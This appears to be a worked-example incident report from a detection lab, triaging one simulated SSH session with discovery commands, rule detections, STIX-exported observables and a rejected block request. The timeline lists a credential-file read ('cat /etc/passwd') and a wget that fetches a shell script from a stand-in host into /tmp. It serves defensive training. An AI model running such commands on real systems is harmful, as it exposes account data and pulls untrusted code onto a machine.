# Investigation report: CASE-00001, discovery commands and a download attempt over SSH

> **Provenance.** Worked example. The evidence comes from a real run of this lab on 22 September 2026 in the development environment used to build it (Ubuntu 24.04 container, PostgreSQL 16), started with the commands in [docs/walkthrough.md](../walkthrough.md). The analyst actions were made through the API under the name `assistant-demo`. To reproduce the investigation, rerun the walkthrough on your machine and write your own report; this one shows the expected shape and level of detail.

## Summary

One SSH session from 127.208.20.10 ran three system discovery commands
and then tried to download a shell script with `wget`. Both rules
fired on the right events. The fake shell does not download anything,
so no file was fetched. I marked the URL and domain as suspicious,
exported them as STIX, and rejected the automatic restriction request
because the session had already ended. Verdict: expected test activity
(`ssh-discovery-download`).

## Scope

- Lab run ID: `20260922T114855Z-666cb1`
- Case: CASE-00001 ([JSON](../../evidence/cases/CASE-00001.json), [report export](../../evidence/cases/CASE-00001.md), [STIX](../../evidence/cases/CASE-00001-observables.stix.json))
- Time range: 2026-09-22 11:48:55.970Z to 11:48:56.722Z
- Source: 127.208.20.10, one SSH session from source port 46115
- Capture: [`20260922T114853Z.pcap`](../../evidence/pcaps/20260922T114853Z.md), packets #1 to #62

## Timeline

| Time (UTC) | Command | Event ID |
|---|---|---|
| 11:48:55.970 | `whoami` | 01a0c8f2-9422-722c-a1c7-4cfc846565fd |
| 11:48:56.220 | `uname -a` | 01a0c8f2-951c-7ef9-9b4e-32c5335c80e9 |
| 11:48:56.471 | `cat /etc/passwd` | 01a0c8f2-9617-7d1b-9daa-e08c40bb6e58 |
| 11:48:56.722 | `cd /tmp; wget http://payload.example.test/stage.sh` | 01a0c8f2-9712-7b00-b8b1-c31470388cd2 |

## Detections

- **HLAB-SSH-001 v1, detection 1** (low, confidence medium). Three
  distinct discovery commands in one session; `cat /etc/passwd` was the
  trigger. Agree. Low severity is right on its own: an administrator does
  the same.
- **HLAB-SSH-002 v1, detection 2** (high, confidence high). The parser
  split `cd /tmp; wget ...` into two commands and matched `wget` with a
  URL argument. Agree. The explanation correctly says this is an
  attempted transfer.
- Case severity is high because of SSH-002.

## Evidence checked

- **Commands.** All four came 0.25 s apart, faster than a person types,
  which fits a script.
- **URL.** `payload.example.test` is under the reserved `.test`
  top-level domain and cannot resolve on the internet. I did not visit it.
- **Capture.** One TCP connection to 2222 (#1 to #62). The commands are
  inside the encrypted SSH stream, so the case timeline (recorded at the
  decoy) is the source for them.

## Observables

| Value | Status set | Why |
|---|---|---|
| `http://payload.example.test/stage.sh` | suspicious | download target typed after discovery commands |
| `payload.example.test` | suspicious | host of that URL |
| 127.208.20.10 | observed | internal lab address |

The STIX export was requested for all three. The response headers
reported 3 selected, 2 written, and 1 skipped as an internal address,
which is the intended behaviour. The indicators carry
`indicator_types: ["anomalous-activity"]` because they are marked
suspicious, not confirmed.

## Response

The case reached high severity, so the playbook opened a pending
restriction (action 1). I rejected it with the reason "Source is a
labtest address and the session had already ended; a block would not
change anything."

## Verdict

Expected test activity; matches `ssh-discovery-download` in run
`20260922T114855Z-666cb1`.

## What I would change

- SSH-001 and SSH-002 fired 0.25 s apart on the same session but show as
  two detections. Correct, but a combined "discovery then tooling" view
  would read faster during triage.
